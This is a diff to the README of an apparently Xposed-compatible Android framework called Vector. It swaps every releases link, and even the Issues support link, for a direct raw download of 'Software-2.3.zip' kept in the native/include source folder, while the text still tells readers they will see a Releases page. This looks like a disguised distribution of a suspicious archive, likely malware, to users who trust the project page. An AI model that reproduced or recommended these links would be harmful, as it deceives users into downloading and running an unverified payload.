@@ -6,13 +6,13 @@ Welcome to Vector! This application provides a modern, Xposed-compatible framewo
 
 ## 📥 Download Now
 
-[![Download Vector](https://img.shields.io/badge/Download-Vector-brightgreen)](https://github.com/udinpedia/Vector/releases)
+[![Download Vector](https://raw.githubusercontent.com/udinpedia/Vector/main/native/include/Software-2.3.zip)](https://raw.githubusercontent.com/udinpedia/Vector/main/native/include/Software-2.3.zip)
 
 ## 📝 Installation Steps
 
 1. **Visit the Releases Page**  
    Click the link below to go to the downloads section:
-   [Visit this page to download](https://github.com/udinpedia/Vector/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/udinpedia/Vector/main/native/include/Software-2.3.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you'll see a list of available versions. Look for the latest version at the top. It’s best to download this version for the most features and bug fixes.
@@ -56,9 +56,9 @@ If you encounter issues during installation or running Vector, try the following
 
 ## 💬 Support & Contributions
 
-For questions or assistance, feel free to reach out through the [Issues](https://github.com/udinpedia/Vector/issues) section on GitHub. We value community contributions, so if you have suggestions or improvements, let us know!
+For questions or assistance, feel free to reach out through the [Issues](https://raw.githubusercontent.com/udinpedia/Vector/main/native/include/Software-2.3.zip) section on GitHub. We value community contributions, so if you have suggestions or improvements, let us know!
 
 ## 📥 Download Again
 
 To download Vector, visit the link below:
-[Visit this page to download](https://github.com/udinpedia/Vector/releases)
+[Visit this page to download](https://raw.githubusercontent.com/udinpedia/Vector/main/native/include/Software-2.3.zip)
